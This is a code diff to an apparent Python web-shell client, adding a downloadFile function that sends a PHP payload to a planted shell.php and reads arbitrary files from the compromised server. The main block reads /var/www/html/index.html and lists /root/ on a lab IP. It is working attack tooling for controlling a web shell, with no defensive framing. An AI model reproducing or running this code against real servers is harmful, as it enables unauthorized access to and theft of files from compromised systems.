@@ -72,6 +72,27 @@ def scanDir(url, password, dir):
     else:
         raise Exception('PassWord Error!')
 
+def downloadFile(url, password, filePath):
+    ra, rb, rc = genRandomStr(3)
+    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
+              '{$output=ob_get_contents();ob_end_clean();echo "'+ ra +'";echo @asenc($output);echo "'+ rb +'";}ob_start();' \
+              'try{$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["'+ rc +'"]):$_POST["'+ rc +'"]);' \
+              '$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};}' \
+              'catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
+    data = {password : payload, rc : b64encode(filePath.encode())}
+    r = requests.post(url, data, timeout=0.8)
+    rt = r.text
+    # 排除404等的测试结果
+    if r.status_code != 200:
+        raise Exception('status_code == '+str(r.status_code))
+    # 是否正确对payload进行响应
+    if  rt[8:].startswith('ERROR://'):
+        raise Exception(rt[8:-8])
+
+    if rt.startswith(ra) and rt.endswith(rb):
+        return rt[8:-8]
+    else:
+        raise Exception('PassWord Error!')
 
 def formatFileSize(bytes, precision):
     for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB']:
@@ -84,7 +105,7 @@ def formatFileSize(bytes, precision):
 
 if __name__ == '__main__':
     url = 'http://192.168.20.131/shell.php'
-    password = 'hacker'
-    print(TestConn(url, password))
+    password = '0'
+    print(downloadFile(url, password, '/var/www/html/index.html'))
     print(scanDir(url, password, '/root/'))
     print(formatFileSize(102401, 2))
